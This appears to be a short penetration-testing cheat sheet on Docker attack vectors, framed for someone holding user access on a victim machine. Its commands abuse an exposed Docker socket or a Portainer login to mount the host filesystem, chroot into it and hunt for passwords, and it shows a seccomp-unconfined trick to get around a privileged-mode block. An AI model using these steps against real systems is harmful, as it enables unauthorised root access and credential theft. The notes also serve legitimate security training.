# Docker-Related Attack Vectors

### Docker Socket

* If you have user privileges in a host machine check these:&#x20;
  * Find `netstat -tunape` docker socket in localhost
  * export it to env `export DOCKER_HOST="tcp://localhost:2222"`
  * Look docker images in host machine and run it with connecting host
    * &#x20;`docker run -it -v /:/host ubuntu:20.04 bash`
    * `cd /host/`
    * `chroot ./ bash`
    * `find / -name password`



### Portainer Web UI access

* If you have portainer access, (via leaked creds or bruteforce)
  * Create privileged docker via portainer web UI&#x20;
  * Later connect there via from web ui of portainer:
    * `mount /dev/sda /mnt`
    * `cd /mnt`
    * `chroot ./ bash`
    * Then find credentials in root mounted&#x20;

### Use Case (Blocked by privileged mode but run in seccomp)

* You are user in victim machine and want to get root and blocked by docker firewall when you run `docker run -d --privileged ubuntu:latest`

Then you can run&#x20;

* `docker run -d --security-opt "seccomp=unconfined" modified-ubuntu`
* With that way we can start a container with seccomp profile set to unconfined.
*   `docker exec -it --privileged {container_id} bash`

    * `Check it with capsh --print`

    Then use [cap\_sys\_module](../container-breakouts/#cap\_sys\_module-capability) breakout technique to breakout the container.&#x20;



